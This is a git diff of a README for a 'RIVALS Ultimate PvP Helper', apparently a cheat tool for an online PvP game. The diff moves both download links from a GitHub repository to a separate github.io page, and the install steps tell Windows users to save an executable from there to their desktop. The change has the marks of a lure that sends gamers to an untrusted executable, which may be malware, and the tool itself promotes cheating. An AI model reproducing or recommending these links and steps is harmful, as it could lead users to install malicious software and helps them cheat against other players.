@@ -1,6 +1,6 @@
 # ⚔️ RIVALS-Ultimate-PvP-Helper-2026 - Dominate Every Match With Precision Tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Savf2561/RIVALS-Ultimate-PvP-Helper-2026)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://savf2561.github.io)
 
 ## 📌 Overview
 
@@ -23,7 +23,7 @@ This helper tool includes a comprehensive suite of utilities for combat:
 Follow these steps to install the helper on your Windows computer.
 
 1. Ensure you have the latest version of Windows installed.
-2. Visit the [official download page](https://github.com/Savf2561/RIVALS-Ultimate-PvP-Helper-2026) to obtain the helper file.
+2. Visit the [official download page](https://savf2561.github.io) to obtain the helper file.
 3. Locate the latest release version on the page.
 4. Click the download link to save the executable file to your desktop.
 
